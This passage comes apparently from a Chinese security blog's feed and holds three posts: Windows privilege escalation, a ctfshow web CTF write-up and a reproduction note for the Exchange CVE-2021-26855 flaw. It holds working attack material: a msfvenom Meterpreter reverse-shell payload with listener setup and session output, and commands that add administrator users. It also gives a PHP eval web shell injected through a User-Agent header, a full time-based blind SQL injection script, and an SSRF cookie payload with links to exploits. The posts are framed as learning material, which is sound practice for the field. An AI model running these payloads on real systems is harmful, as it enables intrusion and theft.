/priv</td><td>当前帐户权限</td></tr><tr><td>ipconfig</td><td>网络配置信息</td></tr><tr><td>ipconfig /displaydns</td><td>显示DNS缓存</td></tr><tr><td>route print</td><td>打印出路由表</td></tr><tr><td>arp -a</td><td>打印arp表</td></tr><tr><td>hostname</td><td>主机名</td></tr><tr><td>net user</td><td>列出用户</td></tr><tr><td>net user UserName</td><td>关于用户的信息</td></tr><tr><td>net use \SMBPATH Pa$$w0rd /u:UserName</td><td>连接SMB</td></tr><tr><td>net localgroup</td><td>列出所有组</td></tr><tr><td>net localgroup GROUP</td><td>关于指定组的信息</td></tr><tr><td>net user guest /active:yes</td><td>激活guest用户</td></tr><tr><td>net user 用户名 密码/add</td><td>建立用户</td></tr><tr><td>net localgroup administrators 用户名/add</td><td>把用户添加到管理员组中</td></tr><tr><td>net session</td><td>开放给其他机器</td></tr><tr><td>netsh firewall show config</td><td>显示防火墙配置</td></tr><tr><td>DRIVERQUERY</td><td>列出安装的驱动</td></tr><tr><td>tasklist /svc</td><td>列出服务任务</td></tr><tr><td>Tasklist /svc</td><td>find “TermService”</td></tr><tr><td>net start</td><td>列出启动的服务</td></tr><tr><td>dir /s foo</td><td>在目录中搜索包含指定字符的项目</td></tr><tr><td>sc query</td><td>列出所有服务</td></tr><tr><td>sc qc ServiceName</td><td>找到指定服务的路径</td></tr><tr><td>shutdown /r /t 0</td><td>立即重启</td></tr><tr><td>type file.txt</td><td>打印出内容</td></tr><tr><td>icacls “C:\Example”</td><td>列出权限</td></tr><tr><td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td><td>列出已安装的布丁</td></tr><tr><td>(New-Object System.Net.WebClient).DownloadFile(“<a href="http://host/file”,”C:\LocalPath”" target="_blank" rel="noopener">http://host/file”,”C:\LocalPath”</a>)</td><td>利用ps远程下载文件到本地</td></tr><tr><td>wmic product get name,version</td><td>查看当前安装程序</td></tr></tbody></table><h1 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h1><p>“系统内核溢出提权”因其利用便捷成为了最为常用的方法，在使用该方法提权时我们只需要去查看目标系统中打了那些系统补丁，之后去找补丁的”互补”补丁，并利用对应的提权类的漏洞实现权限提升。</p><p>推荐一个提权类exp <a href="https://github.com/Al1ex/Heptagram/tree/master/Windows/Elevation" target="_blank" rel="noopener">https://github.com/Al1ex/Heptagram/tree/master/Windows/Elevation</a>  </p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>MSF框架中自带提权辅助功能模块——post/windows/gather/enum_pathes，该模块会根据漏洞编号快速查找目标系统中的补丁信息。<br>生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.101</span><br><span class="line">lhost =&gt; 192.168.1.101</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>之后成功返回会话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.101:4444</span><br><span class="line">[*] Sending stage (200262 bytes) to 192.168.1.101</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.101:9351) at 2021-06-28 19:26:03 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>之后再Meterpreter中执行如下命令即可查看系统补丁信息(老版本的会给出可用的EXP，MSF5好像不提供了)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to C:/Users/ye1s/.msf4/loot/20210628192724_default_192.168.247.133_enum_patches_561327.txt</span><br><span class="line">[+] KB3192137 installed on 9/12/2016</span><br><span class="line">[+] KB4486129 installed on 6/7/2021</span><br><span class="line">[+] KB3206632 installed on 6/7/2021</span><br></pre></td></tr></table></figure><p>于此同时，我们也可以通过执行以下命令来查看目标系统可用的漏洞，之后探寻提权EXP:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">[*] 192.168.247.133 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/windows...</span><br><span class="line">[*] 192.168.247.133 - 28 exploit checks are being tried...</span><br><span class="line">[+] 192.168.247.133 - exploit/windows/<span class="built_in">local</span>/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.247.133 - Post failed: NoMethodError undefined method `reverse!<span class="string">' for nil:NilClass</span></span><br></pre></td></tr></table></figure><h2 id="Sherlock"><a href="#Sherlock" class="headerlink" title="Sherlock"></a>Sherlock</h2><p>Sherlock(<a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a>) 是一个在Windows下用于本地提权的PowerShell脚本，目前包含了以下漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MS10-015 : User Mode to Ring (KiTrap0D)</span><br><span class="line">MS10-092 : Task Scheduler</span><br><span class="line">MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MS13-081 : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MS15-051 : ClientCopyImage Win32k</span><br><span class="line">MS15-078 : Font Driver Buffer Overflow</span><br><span class="line">MS16-016 : <span class="string">'mrxdav.sys'</span> WebDAV</span><br><span class="line">MS16-032 : Secondary Logon Handle</span><br><span class="line">MS16-034 : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MS16-135 : Win32k Elevation of Privilege</span><br><span class="line">CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc</span><br></pre></td></tr></table></figure><p>该工具的利用也是较为简单，首先下载项目到本地，之后再终端调用Sherlock(获取webshell的主机中直接上传即可)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Import-Module .\Sherlock.ps1</span><br></pre></td></tr></table></figure><p>之后执行以下命令来列举当前系统中所有可利用的漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Find-AllVulns</span><br></pre></td></tr></table></figure><p>当然你也可以搜索某一个特定漏洞，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Find-CVE20177199</span><br></pre></td></tr></table></figure><p>根据Sherlock的说明目前CS已经可以实现” 导入模块——&gt;查询单一漏洞——&gt;直接提权 “的一套流程了，下面是Github中的实例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: 20 bytes</span><br><span class="line">[*] You are Win7-x64\Rasta</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1</span><br><span class="line">[*] Tasked beacon to import: C:\Users\Rasta\Desktop\Sherlock.ps1</span><br><span class="line">[+] host called home, sent: 2960 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell Find-MS14058</span><br><span class="line">[*] Tasked beacon to run: Find-MS14058</span><br><span class="line">[+] host called home, sent: 20 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">beacon&gt; elevate ms14-058 smb</span><br></pre></td></tr></table></figure><h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>以下大部分转自daiker的文章： <a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ntlm-pian/</a> </p><p>windows内部是不保存明文密码的，只保存密码的hash。<br>其中本机用户的密码hash是放在 本地的SAM文件 里面，域内用户的密码hash是存在域控的NTDS.DIT文件 里面。那hash的格式是怎么样的呢?<br>在Windows系统导出密码的时候，经常看到这样的密码格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure><p>其中的</p><ul><li>AAD3B435B51404EEAAD3B435B51404EE是LM Hash</li><li>31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash</li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>全称是LAN Manager Hash, windows最早用的加密算法，由IBM设计。<br>LM Hash的计算:</p><ol><li>用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li><li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</li><li>再分7bit为一组,每组末尾加0，再组成一组</li><li>上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</li><li>将加密后的两组拼接在一起，得到最终LM HASH值。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span><span class="params">(str, Des_Key)</span>:</span></span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(str)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group_just</span><span class="params">(length,text)</span>:</span></span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r'.&#123;%d&#125;'</span> % int(length), text) <span class="comment"># ['0011000', '1001100', '1000110', '0110011', '0100001', '1010100', '1101100', '0000000']</span></span><br><span class="line">    text_area_padding = [i + <span class="string">'0'</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#['00110000', '10011000', '10001100', '01100110', '01000010', '10101000', '11011000', '00000000']</span></span><br><span class="line">    hex_str = <span class="string">''</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = hex(int(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">"L"</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">'0'</span>:</span><br><span class="line">        hex_int = <span class="string">'0000000000000000'</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lm_hash</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">"hex"</span>).ljust(<span class="number">28</span>,<span class="string">'0'</span>) <span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    print(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = bin(int(left_str, <span class="number">16</span>)).lstrip(<span class="string">'0b'</span>).rjust(<span class="number">56</span>, <span class="string">'0'</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = bin(int(right_str, <span class="number">16</span>)).lstrip(<span class="string">'0b'</span>).rjust(<span class="number">56</span>, <span class="string">'0'</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 "KGS!@#$%"进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">'KGS!@#$%'</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">'KGS!@#$%'</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    hash = lm_hash(<span class="string">"123456"</span>)</span><br></pre></td></tr></table></figure><p>LM加密算法存在一些固有的漏洞</p><ul><li>首先，密码长度最大只能为14个字符</li><li>密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</li><li>查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到lm hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7 + 7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度大大降低，这使得14个字符的密码的有效强度等于，7个字符的密码的两倍，该密码的复杂度明显低于  14个字符的密码的理论强度。</li><li>Des密码强度不高</li></ul><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。<br><img src="../../images/window/privilege/1.png" alt=""><br><img src="../../images/window/privilege/2.png" alt=""></p><p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。(因此后面我们介绍身份认证的时候只介绍Net-ntlm，不再介绍net-lm)如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是AAD3B435B51404EEAAD3B435B51404EE。</p><p>所以在win7 中我们看到抓到LM Hash都是AAD3B435B51404EEAAD3B435B51404EE，这里的LM Hash并没有价值</p><p>NTLM Hash的计算</p><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行Unicode编码。</li><li>使用MD4摘要算法对Unicode编码数据进行Hash计算</li></ol><h2 id="获取HASH"><a href="#获取HASH" class="headerlink" title="获取HASH"></a>获取HASH</h2><p><a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a></p><h2 id="破解HASH"><a href="#破解HASH" class="headerlink" title="破解HASH"></a>破解HASH</h2><p>在线网站：<a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack</a></p><p>参考文章：    </p><p>NTLM 基础 介绍：<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x00-qian-yan" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x00-qian-yan</a>  </p><p>Windows常见提权总结：<a href="https://www.freebuf.com/articles/system/254836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/254836.html</a><br><a href="https://cloud.tencent.com/developer/article/1771226" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1771226</a>    </p><p>Windows下常见的内核溢出提权：<a href="https://xz.aliyun.com/t/8292" target="_blank" rel="noopener">https://xz.aliyun.com/t/8292</a></p><p><a href="https://www.freebuf.com/articles/network/247980.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/247980.html</a><br><a href="https://www.freebuf.com/articles/network/250827.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/250827.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;window提权  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow web 刷题</title>
    <link href="https://blog.cfyqy.com/article/9c2cf38e.html"/>
    <id>https://blog.cfyqy.com/article/9c2cf38e.html</id>
    <published>2021-06-11T07:30:04.000Z</published>
    <updated>2021-06-11T08:26:50.871Z</updated>
    
    <content type="html"><![CDATA[<p>ctfshow web刷题</p><a id="more"></a><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>在url添加一句话会被编码，在User-Agent中添加。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 0962422f-8459-4372-8ed2-acebe03635c0.challenge.ctf.show:8080</span><br><span class="line">User-Agent: &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[a]);?&gt; Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>md5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>password字段存在注入，过滤了空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from functools import wraps</span><br><span class="line"></span><br><span class="line">def spend_time(func):</span><br><span class="line">    @wraps(func)</span><br><span class="line">    def wrapper(*agrs, **kwargs):</span><br><span class="line">        startTime &#x3D; time.time()</span><br><span class="line">        func(*agrs, **kwargs)</span><br><span class="line">        endTime &#x3D; time.time()</span><br><span class="line">        sumTime &#x3D; endTime - startTime</span><br><span class="line">        print(&quot;spend time:&quot;, sumTime)</span><br><span class="line"></span><br><span class="line">    return wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def and_operation():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;dceb0f35-65a5-4f40-856e-ecdc2d487f30.challenge.ctf.show:8080&#x2F;&quot;</span><br><span class="line">    flag_payload &#x3D; &quot;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;if((ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;0&#125;,1))&amp;&#123;1&#125;),sleep(2),1)&#x2F;**&#x2F;#&quot;</span><br><span class="line">    info &#x3D; &quot;&quot;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        value &#x3D; 0</span><br><span class="line">        for k in range(7):</span><br><span class="line">            payload &#x3D; flag_payload.format(j, 2 ** k)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">            &#125;</span><br><span class="line">            start_time&#x3D;time.time()</span><br><span class="line">            res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">            end_time&#x3D;time.time()</span><br><span class="line">            spend_time&#x3D;end_time-start_time</span><br><span class="line">            if spend_time&gt;2:</span><br><span class="line">                value &#x3D; value + (2 ** k)</span><br><span class="line">        if value &#x3D;&#x3D; 0:</span><br><span class="line">            break</span><br><span class="line">        info &#x3D; info + chr(value)</span><br><span class="line">        print(info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    and_operation()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctfshow web刷题&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Exchange CVE-2021-26855 漏洞复现</title>
    <link href="https://blog.cfyqy.com/article/28b11aac.html"/>
    <id>https://blog.cfyqy.com/article/28b11aac.html</id>
    <published>2021-06-07T10:56:00.000Z</published>
    <updated>2021-06-09T00:58:18.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-漏洞概述"><a href="#0x1-漏洞概述" class="headerlink" title="0x1 漏洞概述"></a>0x1 漏洞概述</h2><p>CVE-2021-26855 是Exchange中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意HTTP请求并绕过Exchange Server身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。 </p><a id="more"></a><h2 id="0x2-影响版本"><a href="#0x2-影响版本" class="headerlink" title="0x2 影响版本"></a>0x2 影响版本</h2><p>Microsoft Exchange Server: 2010<br>Microsoft Exchange Server: 2013<br>Microsoft Exchange Server: 2016<br>Microsoft Exchange Server: 2019 </p><h2 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h2><p>漏洞环境</p><ul><li>window server 2016</li><li>Exchange Server 2016 CU19</li></ul><p>安装教程可查参考文章：<a href="https://blog.csdn.net/zhaowei198311/article/details/107391577" target="_blank" rel="noopener">https://blog.csdn.net/zhaowei198311/article/details/107391577</a> </p><h2 id="0x3-1-SSRF"><a href="#0x3-1-SSRF" class="headerlink" title="0x3.1 SSRF"></a>0x3.1 SSRF</h2><p>访问url为：<a href="https://xx.xx.xx.xx/owa/auth/ye1s.js（ye1s.js可以随便构造）" target="_blank" rel="noopener">https://xx.xx.xx.xx/owa/auth/ye1s.js（ye1s.js可以随便构造）</a><br>构造Cookie信息为：<br>X-AnonResource=true; X-AnonResource-Backend=DNSLOUG地址/ecp/default.flt?~3<br><img src="../../../images/service/mxchange/1.jpg" alt=""><br><img src="../../../images/service/mxchange/2.jpg" alt=""></p><h2 id="0x3-2-获取邮箱内容"><a href="#0x3-2-获取邮箱内容" class="headerlink" title="0x3.2 获取邮箱内容"></a>0x3.2 获取邮箱内容</h2><p>exp地址：<a href="https://github.com/charlottelatest/CVE-2021-26855" target="_blank" rel="noopener">https://github.com/charlottelatest/CVE-2021-26855</a>   </p><p>可猜测用户名，可列出邮件列表并下载<br><img src="../../../images/service/mxchange/5.jpg" alt=""><br>正确用户名猜解<br><img src="../../../images/service/mxchange/4.jpg" alt=""></p><h2 id="0x3-3-RCE"><a href="#0x3-3-RCE" class="headerlink" title="0x3.3 RCE"></a>0x3.3 RCE</h2><p>exp地址:<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855</a> Exchange RCE/exp.py     </p><p><img src="../../../images/service/mxchange/3.jpg" alt=""></p><h2 id="0x4修复建议"><a href="#0x4修复建议" class="headerlink" title="0x4修复建议"></a>0x4修复建议</h2><p>微软官方已针对该批漏洞发布相关安全更新补丁，可按照以下链接进行升级:<br><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-漏洞概述&quot;&gt;&lt;a href=&quot;#0x1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0x1 漏洞概述&quot;&gt;&lt;/a&gt;0x1 漏洞概述&lt;/h2&gt;&lt;p&gt;CVE-2021-26855 是Exchange中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意HTTP请求并绕过Exchange Server身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。 &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>YII漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/509b0f7f.html"/>
    <id>https://blog.cfyqy.com/article/509b0f7f.html</id>
    <published>2021-05-27T16:48:41.000Z</published>
    <updated>2021-06-07T09:35:37.330Z</updated>
    
